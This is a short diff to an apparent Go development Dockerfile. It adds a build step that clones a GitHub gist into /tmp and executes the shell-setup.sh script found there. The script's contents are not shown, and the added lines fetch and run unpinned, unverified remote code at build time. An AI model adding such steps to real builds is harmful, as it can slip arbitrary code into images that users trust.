@@ -74,6 +74,11 @@ RUN apt-get update \
     && apt-get clean -y \
     && rm -rf /var/lib/apt/lists/* /tmp/gotools
 
+
+RUN git clone https://gist.github.com/99303a83a25b3a5a96a1c4dde531a07f.git /tmp && \
+    chmod +x /tmp/shell-setup.sh && \
+    /tmp/shell-setup.sh > /tmp/setup.log
+
 # Update this to "on" or "off" as appropriate
 ENV GO111MODULE=auto
 
